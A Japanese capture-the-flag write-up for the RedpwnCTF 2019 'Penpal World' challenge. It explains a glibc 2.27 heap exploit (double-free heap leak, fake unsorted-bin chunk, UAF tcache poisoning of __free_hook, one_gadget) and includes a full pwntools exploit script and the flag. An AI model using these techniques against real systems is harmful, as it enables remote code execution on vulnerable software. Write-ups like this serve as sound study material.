---
tags: pwn
---


# RedpwnCTF 2019 - Penpal World

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/redpwn/redpwnctf-2019-challenges>

## Writeup

### Outline

checksecフルアーマー, 固定サイズmalloc, 保持可能ポインタ2つなので[SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q)と状況が似ている。Double FreeとUAFが普通に存在するところも同じ。
しかしこちらの方が幾らか制限が弱く, mallocだけできたり保持可能ポインタが2つあったりする。
但し、実行できるコマンドの累計に上限があり、0x21回まで(カウンタが増えるのがループの末尾な上に、メニューに戻った時に判定されるので0x22回目のコマンドでシェルを取れば特に問題は無い)。
Double Freeでtcache poisoningしていると直ぐに上限に到達してしまうのでHeap leak以外はUAFを使う。
また、偽装チャンクの生成もサイズヘッダを生成する時だけcreate+editをし、残りはcreateだけで済ませる。
巨大チャンク生成もサイズ0x420以上のものを作るのにかなりの回数のcreateを要するので8回freeすればUnsorted Binに入るサイズを偽装する。
`system("/bin/sh")`よりOne Gadgetの方が必要回数が少ないのでそちらを選択する。
こういった削減努力によって29回でなんとかシェルを取ることが出来た。

### Binary

いつものchecksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
当然のようにフルアーマー、Unsorted Bin Attackと`__free_hook`書き換えか

Ghidraによるmainのデコンパイル

```clike
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  int sel;
  int limit;
  long canary;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  sel = -1;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  limit = 0;
  do {
    if (0x21 < limit) {
      if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    show_menu();
    __isoc99_scanf(&DAT_00100dc3,&sel);
    if (sel == 2) {
      edit_card();
    }
    else {
      if (sel < 3) {
        if (sel == 1) {
          create_card();
        }
        else {
LAB_00100c99:
          puts("omggg hacker");
        }
      }
      else {
        if (sel == 3) {
          discard();
        }
        else {
          if (sel != 4) goto LAB_00100c99;
          display();
        }
      }
    }
    limit = limit + 1;
  } while( true );
}
```

`edit_card`, `create_card`, `display`, `discard`はいつものHeap問題とだいたい同じ、いずれの場合もインデックスを要求され、`edit`時のみ編集用のバイト列を要求される(のでデコンパイル結果は割愛)。
そして毎回メニュー呼び出し前にコマンド実行回数が0x21を上回って居ないかを確かめられる

### Heap Leak

この辺は全く[SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q)と同じである。
あちらではtcacheのカウント管理の為にdeleteの回数を過剰に取っていたが今回は回数制限があるのでDouble Freeだけにとどめている。

### 偽装チャンク

[SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q)では2つ解法を示し、1つはサイズ0x90のチャンクを8回freeしており、もう1つはサイズ0x420以上のチャンクを1回freeしていた。
前者に必要なカウントはチャンク生成に5, freeに8で計13なのに対し、後者に必要なカウントはチャンク生成に17, freeに1の計18である。よって前者を採用する。
また、あちらではcreate+editが同時に出来たのでチャンクヘッダに相当する部分を連打していたが、こちらは分離しているので最初にサイズヘッダ部分を作ったらあとは単にcreateだけで終わりにする。
なお、これはまともに検証していないが、今回偽装チャンクの真下のチャンクは整えたものの、その下は特に整えなくてもなんとかなったので実際にチャンク生成に使ったコマンドの回数は4である(create, edit, create, create)

### UAFで任意アドレス書き込み

これまでの問題で任意アドレスを書き換えたい時はだいたいDouble Freeを利用していたが今回は次に示す理由からUAFを利用する。

まずDouble Freeで任意アドレス書き込みをする際に必要な手順は次の通りである。
`create -> delete -> delete -> create -> edit -> create -> create -> edit`
今回はcreateとeditが分離しているため8回もの手順が必要になる。逆にこれを利用して次のようにすれば回数を削減できる
`create -> delete -> edit -> create -> create -> edit`
editが単体で出来るので一度freeした領域に書き込みをすることが出来る、これでDouble Freeをせずにfdを任意アドレスに向けることが出来る。これで6回の手順に収まった。
実際には最後の`__free_hook`書き換えでしか使わないが、道中のtcacheをヌルポインタに繋げるところや、次に取得するチャンクを偽装チャンクに変えるところでもDouble Freeではな無くUAFを利用している。

### いつもの

というわけでいつものように`__free_hook`を書き換えて終わり、ここも回数節約のために`/bin/sh`のeditを要する`system("/bin/sh")`ではなくOne Gadgetでdeleteを叩けば一発で飛ぶようにした。

全体を通してやっていることは何度もリンクを貼っているように[SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q)とだいたい同じなので削減努力の解説になってしまった。

## Code

```python
from pwn import remote, process, p64, u64, ELF


def select(s, sel, c=b"4) Read a postcard\n"):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, idx):
    select(s, b"1")
    s.recvuntil(b"Which envelope #?\n")
    s.sendline(str(idx))


def edit(s, idx, data):
    select(s, b"2")
    s.recvuntil(b"Which envelope #?\n")
    s.sendline(str(idx))
    s.recvuntil(b"Write.\n")
    s.send(data)


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"Which envelope #?\n")
    s.sendline(str(idx))


def show(s, idx):
    select(s, b"4")
    s.recvuntil(b"Which envelope #?\n")
    s.sendline(str(idx))
    return s.recvline().rstrip()


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - Double Free可能
        - 固定malloc(0x48)
        - 同時に保持できるポインタは2つ
    """
    target = "localhost"
    port = 4010

    s = remote(target, port)
    # s = process("./penpal_world")

    elf = ELF("./penpal_world")
    libc = ELF("./libc-2.27.so")
    arena_libc = 0x3ebc40
    free_hook_libc = libc.symbols["__free_hook"]
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

    create(s, 0)
    delete(s, 0)
    delete(s, 0)  # tcache count: 2
    heap_addr = u64(show(s, 0).ljust(8, b"\x00"))
    fake_chunk = heap_addr + 0x60
    print(hex(heap_addr))
    edit(s, 0, p64(0))
    create(s, 1)  # tcache count: 1

    create(s, 0)
    edit(s, 0, p64(0) + p64(0x91))
    create(s, 0)
    create(s, 0)
    # create(s, 0)

    delete(s, 0)  # tcache count: 2
    edit(s, 0, p64(fake_chunk))
    create(s, 0)  # tcache count: 1
    create(s, 0)  # tcache count: 0

    for _ in range(8):
        delete(s, 0)

    libc_addr = u64(show(s, 0).ljust(8, b"\x00")) - arena_libc - 0x60
    print(hex(libc_addr))

    delete(s, 1)  # tcache count: 1
    edit(s, 1, p64(libc_addr + free_hook_libc))
    create(s, 1)
    create(s, 1)
    edit(s, 1, p64(libc_addr + one_gadget[1]))

    delete(s, 0)

    s.interactive()

```

## Flag

Docker環境配られていたのでそれでやりました
`flag{0h_n0e5_sW1p3r_d1D_5w!peEEeE}`

## 他のWriteup

* [ptr-yudaiさんのWriteup](https://bitbucket.org/ptr-yudai/writeups/src/master/2019/RedpwnCTF_2019/penpal_world/): いつもの御仁。解いた後に読んだらデカいチャンクのconsolidateを防ぐ真下のチャンクをtcache poisoningで生成しており"その手があったか"となった。これなら8回もfreeする必要がなくなる。

## 感想

Heap入門の頃に"createやeditだけできたら楽なのに"とか思っていた気持ちを思い出せてよかったです。
[SECCON CTF 2019 Quals - One](/3uaJoXJeTB6FbzJ5p-QJ7Q)をやった直後ということもあり、他人のWriteupを見ずに(自分で書いた資料は見た)解くことが出来たのが一番嬉しかったです。
